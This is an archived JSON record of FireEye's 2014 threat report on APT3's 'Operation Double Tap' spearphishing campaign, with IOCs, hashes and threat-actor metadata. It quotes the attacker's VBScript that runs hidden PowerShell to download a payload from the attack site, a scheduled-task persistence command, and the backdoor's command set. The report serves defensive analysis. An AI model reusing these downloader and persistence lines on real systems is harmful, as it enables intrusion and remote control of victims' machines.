{
    "id": "d86e5362-23fa-43ed-b165-f33cfbf32dd4",
    "created_at": "2022-10-25T16:48:23.938808Z",
    "updated_at": "2025-03-27T02:15:18.8049Z",
    "deleted_at": null,
    "sha1_hash": "e8fcb14805853185b36093119094085f0f7f86a2",
    "title": "Operation Double Tap",
    "authors": "FireEye",
    "file_creation_date": "2014-11-24T14:44:54Z",
    "file_modification_date": "2014-11-24T14:44:54Z",
    "file_size": 77811,
    "plain_text": "**[APT3 (also known as UPS), the actors responsible for Operation Clandestine Fox has quietly continued to](https://www.fireeye.com/blog/threat-research/2014/04/new-zero-day-exploit-targeting-internet-explorer-versions-9-through-11-identified-in-targeted-attacks.html)**\n\nsend waves of spearphishing messages over the past few months. This actor initiated their most recent\n\ncampaign on November 19, 2014 targeting multiple organizations. The attacker leveraged multiple\n\n[exploits, targeting both CVE-2014-6332 and CVE-2014-4113. CVE-2014-6332 was disclosed publicly on](https://technet.microsoft.com/en-us/library/security/ms14-064.aspx)\n\n2014-11-11 and is a Windows OLE Automation Array Remote Code Execution vulnerability. CVE-2014\n[4113 is a privilege escalation vulnerability that was disclosed publicly on 2014-10-14.](https://www.fireeye.com/blog/threat-research/2014/10/two-targeted-attacks-two-new-zero-days.html)\n\nThe use of CVE-2014-6332 is notable, as it demonstrates that multiple classes of actors, both criminal and\n\nAPT alike, have now incorporated this exploit into their toolkits. Further, the use of both of these two\n\nknown vulnerabilities in tandem is notable for APT3. This actor is historically known for leveraging zero\nday vulnerabilities in widespread but infrequent phishing campaigns. The use of known exploits and more\n\nfrequent attacks may indicate both a shift in strategy and operational tempo for this group.\n\n**The Spearphish**\n\nThe body of the message is below:\n\n_One Month's Free Membership for The PLAYBOY ClUB 1080P HD VIDEOS 100,000 PHOTOS_\n\n_4,000_ _MODELS Nude Celebrities,Playmates,Cybergirls & More! Click_\n\n_hxxp://join.playboysplus.com/signup/ To Get a Free Plus Member Now & Never Miss Another Update._\n\n_Your Member referrals must remain active. If anyone getting \"Promotion not available\" for 1 month free_\n\n_membership, you might get the issue up to 48 hrs once your membership is expired and make sure to_\n\n_Clear out cookies or use another browser or use another PC._\n\nThe webpage contained both CVE-2014-6332 exploit code and a VBScript that invoked PowerShell on the\n\naffected users’ system to download the below payload:\n\nfunction runmumaa()\n\nOn Error Resume Next\n\nset shell=createobject(\"Shell.Application\")\n\nshell.ShellExecute \"powershell.exe\",\"-NoLogo -NoProfile         -NonInteractive -WindowStyle\n\nHidden ( New-Object\n\n“System.Net.WebClient”).DownloadFile(“http://www.playboysplus.com\n\n\n-----\n\nend function\n\nThe CVE-2014-6332 exploit code seen in this incident is derived from the code published at\n\n[http://www.exploit-db.com/exploits/35230/, which has also been incorporated in the Metasploit project.](http://www.exploit-db.com/exploits/35230/)\n\n**The Downloader**\n\nAfter the exploit or script executes, the system downloads install.exe, which has the following metadata:\n\nMD5       5a0c4e1925c76a959ab0588f683ab437\n\nSize      46592 bytes\n\nCompile Time  2014-11-19 08:55:10Z\n\nImport Hash   6b8611f8148a6b51e37fd68e75b6a81c\n\nThe file install.exe attempts to write two files (doc.exe and test.exe) to the hard-coded path\n\n“C:\\Users\\Public”, which fails on Windows XP because that path is not present by default.\n\nThe first dropped file, doc.exe, contains the CVE-2014-4113 exploit and then attempts to execute test.exe\n\nwith the elevated privileges. These files have the following metadata:\n\ndoc.exe (x86):\n\nMD5      492a839a3bf9c61b7065589a18c5aa8d\n\nSize     12288 bytes\n\nImport Hash  9342d18e7d315117f23db7553d59a9d1\n\ndoc.exe (x64):\n\nMD5      744a17a3bc6dbd535f568ef1e87d8b9a\n\nSize     13824 bytes\n\nCompile Time 2014-11-19 08:25:45Z\n\nImport Hash  2fab77a3ff40e4f6d9b5b7e813c618e4\n\ntest.exe:\n\n\n-----\n\nSize     11264 bytes\n\nCompile Time 2014-11-18 10:49:23Z\n\nImport Hash  f34d5f2d4577ed6d9ceec516c1f5a744\n\nThese payload files also have interesting PDB debug strings.\n\ninstall.exe:\n\nc:\\Users\\aa\\Documents\\Visual Studio 2008\\Projects\\MShell\\Release    \\MShell.pdb\n\ndoc.exe:\n\nc:\\Users\\aa\\Documents\\Visual Studio 2008\\Projects\\4113\\Release      \\4113.pdb\n\ntest.exe:\n\nC:\\Users\\aa\\Documents\\Visual Studio 2010\\Projects\\MyRat\\Client\\Client\n\n\\obj\\x86\\Release\\Client.pdb\n\nThe most interesting PDB string is the “4113.pdb,” which appears to reference CVE-2014-4113. This CVE is\n\na local kernel vulnerability that, with successful exploitation, would give any user SYSTEM access on the\n\nmachine.\n\nThe malware component, test.exe, uses the Windows command \"cmd.exe\" /C whoami” to verify it is\n\nrunning with the elevated privileges of “System” and creates persistence by creating the following\n\nscheduled task:\n\nschtasks /create /tn \"mysc\" /tr C:\\Users\\Public\\test.exe /sc ONLOGON   /ru \"System\"\n\nWhen executed, the malware first establishes a SOCKS5 connection to 192.157.198.103 using TCP port\n\n1913. The malware sends the SOCKS5 connection request \"05 01 00\" and verifies the server response\n\nstarts with \"05 00\". The malware then requests a connection to 192.184.60.229 on TCP port 81 using the\n\ncommand \"05 01 00 01 c0 b8 3c e5 00 51\" and verifies that the first two bytes from the server are \"05 00\"\n\n(c0 b8 3c e5 is the IP address and 00 51 is the port in network byte order).\n\nOnce the connection to the server is established, the malware expects a message containing at least three\n\nbytes from the server. These first three bytes are the command identifier. The following commands are\n\nsupported by the malware:\n\n\n-----\n\n00 00 00 Content after command ID is written to:\n\nC:\\Users\\\n\n[Username]\\AppData\\Local\\Temp\\notepad1.exe\n\n00 00 01 Deletes the files:\n\nC:\\Users\\\n\n[Username]\\AppData\\Local\\Temp\\notepad.exe\n\nC:\\Users\\\n\n[Username]\\AppData\\Local\\Temp\\newnotepad.exe\n\n00 00 02 Malware exits\n\n00 00 03 Malware downloads the URL that follows the\ncommand ID. The file is saved to:\n\nC:\\Users\\\n\n[Username]\\AppData\\Local\\Temp\\notepad.exe\n\n00 00 04 Content after command ID is written to:\n\nC:\\Users\\\n\n[Username]\\AppData\\Local\\Temp\\notepad2.exe\n\n00 00 05 The files notepad1.exe and notepad2.exe are\nconcatenated together and written to C:\\Users\\\n\n[Username]\\AppData\\Local\\Temp\\newnotepad.exe\nand executed\n\n00 00 06 The contents of the following file is sent to the\nserver:\n\nC:\\Users\\\n\n[Username]\\AppData\\Local\\Temp\\note.txt\n\n00 00 07 The string following the command ID is executed\nusing \"cmd /C\" and results are sent to server\n\n**Links to APT3**\n\nOn October 28, we observed APT3 sending out spearphishing messages containing a compressed\n\nexecutable attachment. The deflated exe was a variant of the same downloader described above and\n\nconnected to 198.55.115.71 over port 1913 via SOCKS5 proxy. The secondary payload in that case was\n\ndetected as Backdoor.APT.CookieCutter (aka Pirpi) and also named newnotepad.exe (MD5\n\n8849538ef1c3471640230605c2623c67) and connected to the known APT3 domains:\n\ninform.bedircati[.]com\n\npn.lamb-site[.]com\n\n210.109.99.64\n\n|Col1|C:\\Users\\ [Username]\\AppData\\Local\\Temp\\notepad1.exe|\n|---|---|\n|00 00 01|Deletes the files: C:\\Users\\ [Username]\\AppData\\Local\\Temp\\notepad.exe C:\\Users\\ [Username]\\AppData\\Local\\Temp\\newnotepad.exe|\n|00 00 02|Malware exits|\n|00 00 03|Malware downloads the URL that follows the command ID. The file is saved to: C:\\Users\\ [Username]\\AppData\\Local\\Temp\\notepad.exe|\n|00 00 04|Content after command ID is written to: C:\\Users\\ [Username]\\AppData\\Local\\Temp\\notepad2.exe|\n|00 00 05|The files notepad1.exe and notepad2.exe are concatenated together and written to C:\\Users\\ [Username]\\AppData\\Local\\Temp\\newnotepad.exe and executed|\n|00 00 06|The contents of the following file is sent to the server: C:\\Users\\ [Username]\\AppData\\Local\\Temp\\note.txt|\n|00 00 07|The string following the command ID is executed using \"cmd /C\" and results are sent to server|\n\n\n-----\n\nknown domain referenced in our Operation Clandestine Fox blog.\n\nDOMAIN FIRST SEEN LAST SEEN IP ADDRESS\n\nsecuritywap.com 2014-11-17 2014-11-20 192.184.60.229\n\nwww.securitywap.com 2014-11-17 2014-11-20 192.184.60.229\n\nIn addition, the join.playboysplus[.]com exploit and payload delivery site resolves to 104.151.248.173.\n\nThis IP has hosted other domains used by APT3 in past campaigns:\n\nDOMAIN FIRST SEEN LAST SEEN IP ADDRESS\n\njoin.playboysplus[.]com 2014-11-21 2014-11-21 104.151.248.173\n\nwalterclean[.]com 2014-11-18 2014-11-20 104.151.248.173\n\nwww.walterclean[.]com 2014-11-18 2014-11-20 104.151.248.173\n\n[As we discussed in our previous blog detailing previous APT3 activity, the walterclean[.]com served as a](https://www.fireeye.com/blog/threat-research/2014/06/clandestine-fox-part-deux.html)\n\nPlugx/Kaba command and control server.\n\n**Conclusion**\n\nAlthough APT3 is well known for employing zero-day exploits in their attacks, recent activity has\n\ndemonstrated that they will also attack targets with known exploits or social engineering.\n\nSince Operation Clandestine Fox, we have observed this actor execute multiple attacks that did not rely on\n\nzero-day exploits. The combination of this sustained operational tempo and lack of zero-day\n\n**exploits may indicate that this group has changed strategy and has decided to attack more**\n\n**frequently and does not have steady access to zero-day exploit code. No matter the strategy,**\n\nthis actor has shown an ability to operate successfully.\n\n[IOCs for this threat can be found here.](https://github.com/fireeye/iocs/tree/master/APT3)\n\n|DOMAIN|FIRST SEEN|LAST SEEN|IP ADDRESS|\n|---|---|---|---|\n|securitywap.com|2014-11-17|2014-11-20|192.184.60.229|\n|www.securitywap.com|2014-11-17|2014-11-20|192.184.60.229|\n\n|DOMAIN|FIRST SEEN|LAST SEEN|IP ADDRESS|\n|---|---|---|---|\n|join.playboysplus[.]com|2014-11-21|2014-11-21|104.151.248.173|\n|walterclean[.]com|2014-11-18|2014-11-20|104.151.248.173|\n|www.walterclean[.]com|2014-11-18|2014-11-20|104.151.248.173|\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "d63ae2b7-445f-460d-965d-2676dacdb6de",
            "created_at": "2022-10-25T15:59:19.552139Z",
            "updated_at": "2022-10-25T15:59:19.552139Z",
            "deleted_at": null,
            "name": "APTnotes",
            "url": "https://github.com/aptnotes/data",
            "description": "APTnotes data",
            "reports": null
        },
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        }
    ],
    "references": [
        "https://app.box.com/s/30f8215m5iow438k6gpjuxyvlsid7oom",
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2014/2014.11.21.Operation_Double_Tap/OperationDoubleTap.pdf"
    ],
    "report_names": [
        "OperationDoubleTap"
    ],
    "threat_actors": [
        {
            "id": "61c4ddc4-156b-4828-8570-0979da81f3d0",
            "created_at": "2022-10-25T16:47:55.593828Z",
            "updated_at": "2025-03-27T02:05:17.275161Z",
            "deleted_at": null,
            "main_name": "BRONZE MAYFAIR",
            "aliases": [
                "Gothic Panda ",
                "TG-0110 ",
                "APT3 "
            ],
            "source_name": "Secureworks:BRONZE MAYFAIR",
            "tools": [
                " HUC Proxy Malware (Htran)",
                " Pirpi",
                " SplitVPN",
                " ctt",
                " ctx",
                "Cookiecutter"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "761d1fb2-60e3-46f0-9f1c-c8a9715967d4",
            "created_at": "2023-01-06T13:46:38.269054Z",
            "updated_at": "2025-03-27T02:00:02.789278Z",
            "deleted_at": null,
            "main_name": "APT3",
            "aliases": [
                "TG-0110",
                "Group 6",
                "Buckeye",
                "Boyusec",
                "BORON",
                "BRONZE MAYFAIR",
                "Red Sylvan",
                "GOTHIC PANDA"
            ],
            "source_name": "MISPGALAXY:APT3",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "13354d3f-3f40-44ec-b42a-3cda18809005",
            "created_at": "2022-10-25T15:50:23.275272Z",
            "updated_at": "2025-03-27T02:00:55.418075Z",
            "deleted_at": null,
            "main_name": "APT3",
            "aliases": [
                "APT3",
                "Gothic Panda",
                "Pirpi",
                "UPS Team",
                "Buckeye",
                "Threat Group-0110",
                "TG-0110"
            ],
            "source_name": "MITRE:APT3",
            "tools": [
                "OSInfo",
                "schtasks",
                "PlugX",
                "LaZagne",
                "SHOTPUT",
                "RemoteCMD"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "06f622cb-3a78-49cf-9a4c-a6007a69325f",
            "created_at": "2022-10-25T16:07:23.315239Z",
            "updated_at": "2025-03-27T02:02:09.733197Z",
            "deleted_at": null,
            "main_name": "APT 3",
            "aliases": [
                "APT 3",
                "Bronze Mayfair",
                "Buckeye",
                "Gothic Panda",
                "Group 6",
                "Operation Clandestine Fox",
                "Operation Clandestine Fox, Part Deux",
                "Operation Clandestine Wolf",
                "Operation Double Tap",
                "Red Sylvan",
                "TG-0110",
                "UPS Team"
            ],
            "source_name": "ETDA:APT 3",
            "tools": [
                "APT3 Keylogger",
                "Agent.dhwf",
                "BKDR_HUPIGON",
                "Backdoor.APT.CookieCutter",
                "Badey",
                "Bemstour",
                "CookieCutter",
                "Destroy RAT",
                "DestroyRAT",
                "DoublePulsar",
                "EXL",
                "EternalBlue",
                "HTran",
                "HUC Packet Transmit Tool",
                "Hupigon",
                "Hupigon RAT",
                "Kaba",
                "Korplug",
                "LaZagne",
                "MFC Huner",
                "OSInfo",
                "Pirpi",
                "PlugX",
                "RedDelta",
                "RemoteCMD",
                "SHOTPUT",
                "Sogu",
                "TIGERPLUG",
                "TTCalc",
                "TVT",
                "Thoper",
                "Xamtrav",
                "remotecmd",
                "shareip",
                "w32times"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716503,
    "ts_updated_at": 1743041718,
    "ts_creation_date": 1416840294,
    "ts_modification_date": 1416840294,
    "files": {
        "pdf": "https://archive.orkl.eu/e8fcb14805853185b36093119094085f0f7f86a2.pdf",
        "text": "https://archive.orkl.eu/e8fcb14805853185b36093119094085f0f7f86a2.txt",
        "img": "https://archive.orkl.eu/e8fcb14805853185b36093119094085f0f7f86a2.jpg"
    }
}